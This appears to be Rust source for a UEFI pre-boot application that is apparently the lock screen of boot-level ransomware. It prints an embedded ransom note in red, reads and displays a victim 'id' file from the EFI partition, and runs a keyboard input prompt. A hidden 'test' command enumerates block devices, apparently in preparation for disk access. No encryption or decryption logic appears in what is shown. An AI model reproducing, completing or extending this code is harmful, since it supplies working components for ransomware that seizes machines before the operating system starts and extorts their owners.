#![no_main]
#![no_std]
#![feature(abi_efiapi)]

extern crate alloc;

use core::fmt::Write;
use alloc::boxed::Box;
use uefi::prelude::*;
use uefi::{Char16, Event, ResultExt};
use uefi::proto::console::text::{Color, Key};
use alloc::string::{String};
use core::alloc::Layout;
use core::str;
use uefi::exts::allocate_buffer;
use uefi::proto::media::block::BlockIO;
use uefi::proto::media::file::{File, FileAttribute, FileInfo, FileMode};
use uefi::proto::media::fs::SimpleFileSystem;

fn init_screen(st: &mut SystemTable<Boot>) {
    st.stdout().clear().unwrap().unwrap();
    st.stdout().enable_cursor(true).unwrap_success();
    st.stdout().set_color(Color::Red, Color::Black).unwrap_success();
    st.stdout().write_str(include_str!("ransom_note.txt")).unwrap();

    match read_file(&st, "id") {
        Ok(buf) => {
            let content = str::from_utf8(&buf).unwrap();
            st.stdout().write_str(content).unwrap();
        },
        Err(_) => { st.stdout().write_str("File not found").unwrap(); }
    }

    st.stdout().write_str("\n> ").unwrap();
}

fn read_file(st: &SystemTable<Boot>, filename: &str) -> Result<Box<[u8]>, ()> {

    // Get the file system protocol
    let fs = st
        .boot_services()
        .locate_protocol::<SimpleFileSystem>()
        .unwrap_success();
    let fs = unsafe { &mut *fs.get() }; // Unsafe because we need to use the raw pointer

    // Open root directory of EFI System Partition
    let mut root = fs.open_volume().unwrap_success();

    // Get file handle
    let text_file_handle = match root.open(filename, FileMode::Read, FileAttribute::empty()) {
        Ok(file) => file.unwrap(),
        _ => return Err(()), // File not found
    };
    let mut text_file = match text_file_handle.into_type().unwrap_success() {
        uefi::proto::media::file::FileType::Regular(f) => f,
        _ => return Err(()), // File is not a regular file
    };

    // Read file size
    let mut buf = [0; 500];
    let text_info: &mut FileInfo = text_file.get_info(&mut buf).unwrap_success();
    let text_size = text_info.file_size() as usize;

    // Allocate a buffer for the file contents with a proper alignment
    let buf_layout = Layout::array::<u8>(text_size).unwrap();
    let mut buf = allocate_buffer(buf_layout);

    // Read file content into buffer
    text_file.read(&mut buf).unwrap_success();

    // Close file handle
    text_file.close();

    Ok(buf)
}

fn take_input(system_table: &mut SystemTable<Boot>, char_16: Char16, buffer: &mut String) {
    let mut st = unsafe {system_table.unsafe_clone()};
    let stdout = system_table.stdout();
    let char_key = char::from(char_16);
    match char_key {

        // When user press [Enter]
        '\r' => {
            if buffer == "clear" {
                stdout.clear().unwrap_success();
                init_screen(&mut st);
                buffer.clear();
            } else if buffer == "test" {

                let blockio = st.boot_services().find_handles::<BlockIO>().unwrap_success();
                log::info!("{:#?}", blockio.len());
                log::info!("{:#?}", blockio[0]);

            } else {
                stdout.write_char('\n').unwrap();
                stdout.write_str(buffer.as_str()).unwrap();
                stdout.write_str("\n> ").unwrap();
                buffer.clear();
            }
        }

        // When user press [Backspace]
        '\x08' => {
            if buffer.len() == 0 { return; } else {
                buffer.pop();
                stdout.write_char(char_key).unwrap();
            }
        }

        // Whatever character
        _ => {
            buffer.push(char_key);
            stdout.write_char(char_key).unwrap();
        }
    }
}

fn wait_for_input(boot_services: &BootServices, events: &mut [Event; 1]) {
    boot_services.wait_for_event(events).unwrap().unwrap();
}

#[entry]
fn main(_handle: Handle, mut st: SystemTable<Boot>) -> Status {
    uefi_services::init(&mut st).unwrap_success();

    init_screen(&mut st);
    let mut buffer: String = String::from("");

    let mut key_event = unsafe { [st.stdin().wait_for_key_event().unsafe_clone()] };

    loop {
        wait_for_input(st.boot_services(), &mut key_event);
        if let Some(Key::Printable(key)) = st.stdin().read_key().unwrap_success() {
            take_input(&mut st, key, &mut buffer);
        }
    }

    //Status::SUCCESS
}
